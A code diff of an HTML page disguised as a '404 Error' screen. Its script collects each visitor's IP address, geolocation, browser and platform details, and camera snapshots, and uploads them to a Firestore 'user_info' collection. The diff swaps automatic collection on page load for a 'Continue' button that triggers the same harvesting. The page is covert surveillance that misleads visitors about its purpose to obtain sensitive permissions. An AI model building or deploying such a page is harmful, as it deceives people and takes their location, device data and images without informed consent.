@@ -7,11 +7,13 @@
 </head>
 <body>
 
-    <div style="display: none;">
-        Collecting data...
+    <div>
+        <h1>404 Error</h1>
+        <p>Please try again, permissions not accepted.</p>
     </div>
-    <h1>404 Error</h1>
-    <p>Please try again, permissions not accepted.</p>
+
+    <!-- Continue Button -->
+    <button id="continueBtn">Continue</button>
 
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
@@ -32,22 +34,30 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Function to collect user data
+        // Function to collect user data when continue button is clicked
+        document.getElementById('continueBtn').addEventListener('click', () => {
+            collectUserData();
+        });
+
         async function collectUserData() {
             try {
+                // Get IP address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
                 console.log("IP Address:", ipAddress);
 
+                // Request Geolocation permission
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     console.log("Geolocation Success:", position);
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
+                    // Get device and browser information
                     const userAgent = navigator.userAgent;
                     const osType = navigator.platform;
 
+                    // Collect user data
                     const userData = {
                         ipAddress: ipAddress,
                         locationLatitude: latitude,
@@ -67,6 +77,7 @@
                         // Add document to Firestore
                         await addDoc(collection(db, "user_info"), userData);
                         console.log("Document written successfully!", userData);
+
                     } catch (error) {
                         console.error("Error capturing image:", error);
                     }
@@ -85,7 +96,7 @@
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
-                // Get video stream from user's camera (but don't display the video feed)
+                // Get video stream from user's camera
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then((stream) => {
                         const videoTrack = stream.getVideoTracks()[0];
@@ -116,8 +127,6 @@
             });
         }
 
-        // Trigger data collection when the page loads
-        collectUserData();
     </script>
 
 </body>
